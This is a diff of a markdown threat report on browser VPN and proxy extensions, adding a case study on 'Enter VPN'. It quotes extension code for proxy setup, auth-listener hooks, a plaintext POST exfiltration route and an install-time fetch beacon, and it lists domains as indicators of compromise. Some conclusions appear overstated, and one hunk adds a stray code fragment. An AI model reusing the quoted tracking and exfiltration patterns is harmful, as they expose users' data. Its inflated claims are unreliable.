@@ -28,7 +28,7 @@ This extension manifest represents the ultimate combination of high-impact explo
 * `"proxy"`, `"webRequest"`, `"webRequestBlocking"`, `"management"`, and `"<all_urls>"`
 
 #### Technical Impact:
-This configuration provides the tool with absolute authority to orchestrate **Man-in-the-Middle (MitM)** attacks. The script can intercept, alter, or drop raw network packets in flight, strip critical browser security headers (such as CSP/HSTS), monitor other installed security add-ons, and force global traffic routing over external nodes.
+This configuration provides the tool with absolute authority to orchestrate Man-in-the-Middle (MitM) attacks. The script can intercept, alter, or drop raw network packets in flight, strip critical browser security headers (such as CSP/HSTS), monitor other installed security add-ons, and force global traffic routing over external nodes.
 
 ### 🔍 Technical Code Deep-Dive
 
@@ -52,17 +52,20 @@ browser.webRequest.onAuthRequired.addListener(..., "<all_urls>", ["blocking"]);
 // Actively traps and monitors native HTTP basic authentication dialogues.
 
 // C. Plaintext Data Exfiltration APIs:
-$.ajax({
+\$.ajax({
     type: "POST",
     url: "/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1",
     data: JSON.stringify(exfiltrated_data)
 });
 ```
-* **Analysis:** The explicit server routing parameters **`nocrypt/1`** and **`nocbase64/1`** prove that the operators are transmitting harvested user telemetry, browsing histories, and configuration mapping targets back to their core infrastructure completely in **unencrypted plaintext**, exposing user payloads across the local network path.
+* **Analysis:** The explicit server routing parameters `nocrypt/1` and `nocbase64/1` prove that the operators are transmitting harvested user telemetry, browsing histories, and configuration mapping targets back to their core infrastructure completely in unencrypted plaintext, exposing user payloads across the local network path.
 
 ### 🛡️ Indicators of Compromise (IoCs)
 * **Active Traffic Hijacking Domain:** `renew.5ufweb.cc:443`
 * **Plaintext C2 Exfiltration Routes:** `/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1`, `/api_add_webproxy_site/index/nocrypt/1/nocbase64/1`
+
+});
+```
 
 ---
 
@@ -121,7 +124,7 @@ var FALLBACK_SERVERS = [
 
 ### 🚨 The Store Deception Matrix
 A critical divergence exists between the extension's public marketplace assertions and its actual production manifest:
-* **The Marketplace Claim:** The official browser add-on store states that the extension requires **"Optional permissions: Access your data for all websites"** and declares that **"this extension doesn't require data collection."**
+* **The Marketplace Claim:** The official browser add-on store states that the extension requires "Optional permissions: Access your data for all websites" and declares that "this extension doesn't require data collection."
 * **The Code Reality:** The unzipped `manifest.json` completely bypasses user opt-in consent by explicitly hardcoding blanket root access within mandatory blocks:
   ```json
   "permissions": ["storage", "proxy", "webRequest", "webRequestAuthProvider"],
@@ -137,7 +140,7 @@ const controller = new AbortController();
 const timeoutId = setTimeout(() => controller.abort(), 5000);
 const response = await fetch('https://noprox.com', { signal: controller.signal });
 ```
-* **Analysis:** Despite claiming zero data tracking, the code builds a mandatory fetch beacon to their commercial domain (`noprox.com`). This forces the browser to leak the client's **unmasked IP address, exact geographic coordinates, ISP information, and browser configuration string** right at installation.
+* **Analysis:** Despite claiming zero data tracking, the code builds a mandatory fetch beacon to their commercial domain (`noprox.com`). This forces the browser to leak the client's unmasked IP address, exact geographic coordinates, ISP information, and browser configuration string right at installation.
 
 #### 2. Interception of Credentials and Plaintext Storage Risks
 ```javascript
@@ -152,3 +155,86 @@ chrome.webRequest.onAuthRequired.addListener((details, asyncCallback) => {
     });
 });
 ```
+* **Analysis:** The background worker attaches a dynamic listener to the raw proxy pipe using `webRequestAuthProvider`. This confirms the extension maintains a database profile (`apiProxies`) that stores and handles highly sensitive user proxy authentication strings and passwords completely in unencrypted plaintext inside local cache blocks.
+
+### 🛡️ Indicators of Compromise (IoCs)
+* **Primary Infrastructure Beacon:** `noprox.com`
+* **Fingerprint Capture Route:** `https://noprox.com`
+* **Target Cache Registry Blocks:** `apiProxies`, `proxyAuth`
+
+
+---
+
+# 📁 Case Study 04: Enter VPN
+
+### 📌 Metadata
+* **Extension Name:** Enter VPN
+* **Developer Footprint:** EnterVPN (All Rights Reserved)
+* **Target Architecture:** Manifest V3 / Gecko Cross-Platform Integration
+* **Status:** 🔴 CRITICAL THREAT / INFORMATION STEALER ENGINE
+
+### 🚨 Full-Spectrum Browser Monitoring Matrix
+The extension's production `manifest.json` file requests the absolute maximum authority allowed by the modern browser runtime engine, completely stripping away the concept of client-side sandboxing:
+```json
+"permissions": [
+  "storage", "proxy", "activeTab", "<all_urls>", "management", 
+  "privacy", "tabs", "webRequest", "webRequestBlocking", "notifications"
+]
+```
+
+#### Risk Assessment & Intercept Capabilities:
+* **`<all_urls>` + `webRequestBlocking`:** Establishes a permanent, structural Man-in-the-Middle (MitM) pipe across the entire browser, granting real-time packet modification authorities.
+* **`management`:** Grants the script the ability to scan, index, and dynamically disable competing browser defense systems or ad-blockers.
+* **`privacy` + `tabs`:** Allows the extension to actively override native browser safety toggles while tracking real-time navigation history and user form inputs.
+
+### 🔍 Technical Code Deep-Dive
+
+#### 1. Global Credential Interception and Harvesting Hook
+Analysis of the network listener script unmasks a highly aggressive handler bound directly to the browser's core authentication pipe:
+
+```javascript
+browser.webRequest.onAuthRequired.addListener(
+    (details) => {
+        console.log("Fetching credentials, please wait.");
+        browser.storage.sync.get(['username', 'password'])
+            .then((credentials) => {
+                serverCredentials.username = credentials.username;
+                serverCredentials.password = credentials.password;
+                return { authCredentials: serverCredentials };
+            });
+    }, 
+    { urls: ["<all_urls>"] }, 
+    ['blocking']
+);
+```
+* **Exploit Analysis:** By hardcoding the destination constraint filter to `["<all_urls>"]` paired with the synchronous `['blocking']` mechanism, the extension intercepts the authentication loop of every website on the internet. Instead of preserving native browser login boundaries, the script forces an override that extracts plain-text credential objects (`serverCredentials`) from local sync storage and injects them dynamically across the interface hook.
+
+#### 2. Encryption Degradation and Plaintext Traffic Insecurity
+The tunnel establishment routine contains a critical design configuration that intentionally degrades standard user communication parameters:
+
+```javascript
+var proxySettings = {
+    proxyType: "manual",
+    http: server.ip.trim() + ":3128",
+    httpProxyAll: true
+};
+browser.proxy.settings.set({ value: proxySettings }, () => console.log("Proxy settings set."));
+```
+* **Vulnerability Assessment:** The script forces the browser to interface with remote host nodes over port `3128`—the classic signature for basic Squid Proxy utilities. By explicitly applying a `manual` proxy mapping over raw `http` rules (rather than HTTPS or SOCKS5) and mapping it to `httpProxyAll: true`, the extension strips all native encryption from the browser. Every single web request, packet header, and text string flies through the proxy loop in unencrypted cleartext, allowing any local router, ISP, or middleman operator to capture profile metrics effortlessly.
+
+---
+
+## 🚀 The Combined Attack Loop Lifecycle
+1. The user installs the extension, immediately granting maximum browser management capabilities.
+2. Clicking "Connect" triggers the proxy tunnel setup, locking the browser connection exclusively into an unencrypted cleartext HTTP channel over port `3128`.
+3. Because the credential filter handles `["<all_urls>"]`, any node along that open, unencrypted internet path can trigger an authentication prompt, forcing the extension to automatically leak your unencrypted account strings directly onto the open network wire.
+
+---
+
+## 🛡️ Indicators of Compromise (IoCs)
+* **Insecure Tunnel Infrastructure Port:** `:3128` (Squid Proxy Footprint)
+* **Global Interception Targets:** `["<all_urls>"]` via `onAuthRequired`
+* **Local Identity Cache Keys:** `apiProxies`, `serverCredentials`, `proxyActive`
+
+---
+*Report Compilation and Threat Analysis verified via code review guidelines.*
